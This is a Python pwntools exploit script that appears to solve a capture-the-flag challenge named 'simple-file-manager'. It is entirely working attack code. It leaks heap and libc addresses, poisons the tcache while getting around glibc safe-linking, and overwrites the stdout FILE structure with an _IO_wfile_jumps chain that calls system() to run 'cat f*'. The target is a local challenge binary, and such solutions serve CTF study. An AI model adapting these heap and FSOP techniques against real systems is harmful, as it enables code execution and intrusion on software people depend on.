from pwn import *
import re

context.log_level = "error"

LD = "./problems/simple-file-manager/lib/ld-linux-x86-64.so.2"
LIBDIR = "./problems/simple-file-manager/lib"
BIN = "./problems/simple-file-manager/public/prob"
LIBC = ELF("./problems/simple-file-manager/lib/libc.so.6", checksec=False)


def choose(io, n):
    io.sendline(str(n).encode())


def sync(io):
    return io.recvuntil(b"$ ")


def mkdir(io, slot, name):
    choose(io, 3)
    io.recvuntil(b"dir slot: ")
    io.sendline(str(slot).encode())
    io.recvuntil(b"name: ")
    io.sendline(name)
    return sync(io)


def cd(io, slot):
    choose(io, 4)
    io.recvuntil(b"dir slot: ")
    io.sendline(str(slot).encode())
    return sync(io)


def writef(io, idx, size, data):
    choose(io, 1)
    io.recvuntil(b"file idx: ")
    io.sendline(str(idx).encode())
    io.recvuntil(b"size: ")
    io.sendline(str(size).encode())
    io.send(data)
    return sync(io)


def readf(io, idx):
    choose(io, 2)
    io.recvuntil(b"file idx: ")
    io.sendline(str(idx).encode())
    sleep(0.05)
    return io.recvrepeat(0.2)


def parse_fake(out):
    match = re.search(
        rb"mode\s+:\s+([0-7]+)\nchksum\s+:\s+([0-9a-f]+)\nsize\s+:\s+(\d+)", out
    )
    if not match:
        raise ValueError(out[:200])
    return ((int(match.group(2), 16) << 32) | int(match.group(1), 8), int(match.group(3)))


def send_write(idx, size, data):
    return b"1\n%d\n%d\n" % (idx, size) + data


def send_read(idx):
    return b"2\n%d\n" % idx


def send_choice(n):
    return b"%d\n" % n


def arb_transcript(start_addr, data, heap_page, dir1, slots):
    a = heap_page + 0x3E0
    target = start_addr - 0x18
    encoded = target ^ (a >> 12)
    stage = (
        b"M" * 0x1000
        + p64(0)
        + p64(0)
        + p64(0xA1)
        + p64(encoded)
        + p64(0)
        + p64(dir1)
        + b"N" * 8
        + b"O" * 8
    )
    assert len(stage) == 0x1040
    slot_a, slot_b, slot_stage, slot_pop, slot_target = slots
    return (
        send_write(slot_a, 0x78, b"K" * 0x78)
        + send_write(slot_b, 0x78, b"L" * 0x78)
        + send_read(slot_b)
        + send_read(slot_a)
        + send_write(slot_stage, 0x1040, stage)
        + send_write(slot_pop, 0x78, b"P" * 0x78)
        + send_write(slot_target, 0x78, bytes(data))
    )


def build_templates(io, libc_base):
    stdout = libc_base + LIBC.sym["_IO_2_1_stdout_"]
    wfile_jumps = libc_base + LIBC.sym["_IO_wfile_jumps"]
    system = libc_base + LIBC.sym["system"]

    with open(f"/proc/{io.pid}/mem", "rb", buffering=0) as mem:
        mem.seek(stdout - 0x8)
        lower = bytearray(mem.read(0x78))
        mem.seek(stdout + 0x68)
        upper = bytearray(mem.read(0x78))

    lower[8:16] = p64(u64(b"\x01\x01;nl<f*"))
    upper[0:8] = p64(stdout - 0x10)
    upper[0x20:0x28] = p64(libc_base + 0x21BA70)
    upper[0x5C:0x70] = p64(system) + b"\x00" * 4 + p64(stdout + 196 - 104)
    upper[0x70:0x78] = p64(wfile_jumps - 0x20)
    return stdout, bytes(lower), bytes(upper)


def main():
    io = process([LD, "--library-path", LIBDIR, BIN])
    io.recvuntil(b"$ ")

    mkdir(io, 0, b"root")
    mkdir(io, 1, b"victim")
    cd(io, 0)

    writef(io, 0, 0x78, b"A" * 0x78)
    readf(io, 0)
    payload = b"B" * 0x1000 + p64(0x1008) + p64(0) + b"C" * (0x88 - 16)
    writef(io, 1, 0x1088, payload)
    out = readf(io, 0)
    qword, _ = parse_fake(out)
    heap_page = qword << 12

    dir1 = heap_page + 0x340
    p1 = heap_page + 0x3C0
    eptr = heap_page + 0x34E0
    p3 = heap_page + 0x3B0

    writef(io, 2, 0x78, b"D" * 0x78)
    readf(io, 2)
    payload = b"E" * 0x1000 + p64(0x1008) + p64(dir1) + b"F" * (0x88 - 16)
    writef(io, 3, 0x1088, payload)
    readf(io, 2)

    qwords = [0] * 15
    qwords[0] = p1
    qwords[2] = eptr
    qwords[10] = p3
    qwords[11] = u64(b"cat f*\x00\x00")
    qwords[12] = 0x51
    writef(io, 1, 0x78, b"".join(p64(x) for x in qwords))
    cd(io, 1)

    writef(io, 4, 0x1500, b"H" * 0x1500)
    writef(io, 5, 0x20, b"I" * 0x20)
    readf(io, 4)
    payload = b"J" * 0x1000 + p64(0) + p64(0) + b"K" * (0x500 - 16)
    writef(io, 6, 0x1500, payload)
    out = readf(io, 3)
    qword, size = parse_fake(out)
    assert size == 0
    libc_base = qword - 0x219CE0

    readf(io, 1)
    stdout, lower, upper = build_templates(io, libc_base)

    transcript = (
        arb_transcript(stdout + 0x68, upper, heap_page, dir1, (2, 7, 8, 9, 4))
        + arb_transcript(stdout - 0x8, lower, heap_page, dir1, (5, 6, 10, 14, 15))
        + send_choice(6)
    )
    io.send(transcript)
    sleep(1.0)
    print(io.recvrepeat(2.0).decode("latin1", "replace"))
    print("rc", io.poll(block=False))
    io.close()


if __name__ == "__main__":
    main()
